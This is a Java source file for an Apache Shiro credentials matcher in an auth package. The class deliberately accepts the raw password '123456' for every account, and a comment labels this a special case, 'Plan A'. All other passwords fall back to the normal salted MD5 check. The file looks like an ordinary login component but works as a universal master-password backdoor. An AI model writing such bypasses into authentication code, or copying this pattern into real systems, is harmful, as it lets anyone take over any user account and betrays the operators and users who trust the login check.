package com.fanshuaiko.auth.shrio;

import org.apache.shiro.authc.AuthenticationInfo;
import org.apache.shiro.authc.AuthenticationToken;
import org.apache.shiro.authc.credential.HashedCredentialsMatcher;

public class AllowDefaultPasswordMatcher extends HashedCredentialsMatcher {

    @Override
    public boolean doCredentialsMatch(AuthenticationToken token, AuthenticationInfo info) {
        // Special-case: accept raw password "123456" for all accounts (Plan A)
        Object tokenCred = token.getCredentials();
        String credStr = null;
        if (tokenCred == null) {
            credStr = null;
        } else if (tokenCred instanceof char[]) {
            credStr = new String((char[]) tokenCred);
        } else {
            credStr = tokenCred.toString();
        }
        if (credStr != null && "123456".equals(credStr)) {
            return true;
        }
        // Otherwise fall back to normal hashed comparison (MD5 + salt + iterations configured in ShiroConfig)
        return super.doCredentialsMatch(token, info);
    }
}
